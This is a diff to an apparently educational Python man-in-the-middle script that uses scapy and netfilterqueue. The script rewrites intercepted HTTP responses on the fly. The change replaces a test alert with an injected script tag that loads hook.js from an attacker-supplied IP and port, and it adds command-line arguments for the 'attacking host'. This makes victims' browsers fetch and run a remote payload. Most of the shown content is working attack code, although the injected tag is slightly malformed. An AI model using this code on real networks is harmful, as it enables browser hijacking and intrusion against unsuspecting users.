@@ -4,7 +4,18 @@
 
 import scapy.all as scapy
 import netfilterqueue
+import argparse
 import re
+
+
+def get_arguments():
+    """Get user supplied arguments from terminal."""
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-i', '--ipt', dest='ip', help='Attacking host IP.')
+    parser.add_argument('-p', '--port', dest='port', help='Port number.')
+    (options) = parser.parse_args()
+
+    return options
 
 
 def set_load(packet, load):
@@ -28,8 +39,9 @@ def process_packet(packet):
 
             elif scapy_packet[scapy.TCP].sport == 80:
                 print('[+] Response')
-                injection_code = '<script>alert(\'test\');</script>'
-                #Replaces the closing body tag in the HTML file with a JavaScript alert and new closing body tag
+                # sets IP address and port for attack
+                injection_code = f'<script src="http://{ip}:{port}/hook.js</script>'
+                # replaces the closing body tag in the HTML file with a JavaScript alert and new closing body tag
                 load = load.replace('</body>', injection_code + '</body>')
                 # matches string Content-Length <some number>, extracting only the number
                 content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
@@ -47,6 +59,10 @@ def process_packet(packet):
 
     packet.accept()
 
+
+options = get_arguments()                                                           # captures argument from terminal
+ip = options.ip
+port= options.port
 
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
